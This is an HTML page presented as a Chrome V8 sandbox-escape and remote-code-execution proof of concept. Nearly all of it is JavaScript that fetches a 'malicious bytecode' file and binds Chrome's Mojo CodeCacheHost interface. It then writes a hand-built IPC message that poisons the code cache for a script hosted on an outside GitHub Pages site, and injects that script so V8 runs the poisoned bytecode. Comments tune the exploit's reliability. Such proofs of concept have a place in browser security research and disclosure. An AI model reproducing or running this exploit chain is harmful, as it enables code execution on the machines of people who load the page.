<!DOCTYPE html>
<html>
<head>
    <title>V8 Sandbox Escape PoC</title>
</head>
<body>
    <h1>Stable Chrome RCE Chain</h1>
    <button id="launch">Poison Cache & Detonate</button>

    <script>
        // Configuration
        const TARGET_URL = "https://linux-1723.github.io/test/exploit.js";
        const PAYLOAD_PATH = "poison.bin";

        async function pwn() {
            console.log("[*] Downloading malicious bytecode...");
            const resp = await fetch(PAYLOAD_PATH);
            const poisonBlob = await resp.arrayBuffer();

            // TRAP 2 FIX: Get the exact timestamp Chrome expects
            console.log("[*] Syncing cache timestamps...");
            const targetResp = await fetch(TARGET_URL, {cache: "reload"});
            const dateHeader = targetResp.headers.get('date') || targetResp.headers.get('last-modified');
            const jsTimeMs = new Date(dateHeader).getTime();
            
            // Convert JS Time (Unix Epoch) to Chrome base::Time (Windows Epoch: Jan 1, 1601)
            // Difference is 11644473600 seconds
            const chromeTime = BigInt(jsTimeMs + 11644473600000) * 1000n;

            console.log("[*] Binding Mojo CodeCacheHost...");
            const pipe = Mojo.createMessagePipe();
            Mojo.bindInterface('blink.mojom.CodeCacheHost', pipe.handle1);

            const bufferSize = poisonBlob.byteLength;
            const sharedBuffer = Mojo.createSharedBuffer(bufferSize);
            const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
            new Uint8Array(mapping.buffer).set(new Uint8Array(poisonBlob));

            // Constructing the perfectly aligned 184-byte Mojo Message
            const msg = new ArrayBuffer(184); 
            const v = new DataView(msg);
            
            // Header
            v.setUint32(0, 24, true); v.setUint32(12, 1, true); 

            // Params Struct
            v.setUint32(24, 48, true); 
            v.setBigUint64(40, 32n, true); 
            v.setBigUint64(48, 96n, true); 
            
            // BigBuffer Union
            v.setUint32(56, 16, true); 
            v.setUint32(60, 1, true);  
            v.setBigUint64(64, 96n, true); 

            // URL Struct 
            v.setUint32(72, 16, true);
            v.setBigUint64(80, 8n, true); 

            // String Array (Target URL)
            v.setUint32(88, 56, true); 
            v.setUint32(92, TARGET_URL.length, true); 
            for(let i=0; i<TARGET_URL.length; i++) {
                v.setUint8(96+i, TARGET_URL.charCodeAt(i));
            }

            // Time Struct (Injecting the synced Chrome Time!)
            v.setUint32(144, 16, true);
            v.setUint32(148, 0, true);
            v.setBigUint64(152, chromeTime, true); 

            // Shared Memory Region Struct 
            v.setUint32(160, 16, true);
            v.setUint32(168, 0, true); 
            v.setUint32(172, bufferSize, true); 

            console.log("[*] Firing IPC Poisoning with timestamp: " + chromeTime);
            pipe.handle0.writeMessage(msg, [sharedBuffer.handle]);

            console.log("[+] Cache Poisoned. Detonating in 1.5 seconds...");
            
            // TRAP 1 FIX: Force V8 to execute and deserialize the code!
            setTimeout(() => {
                const s = document.createElement('script');
                s.src = TARGET_URL;
                document.body.appendChild(s);
            }, 1500);
        }

        document.getElementById('launch').onclick = pwn;
    </script>
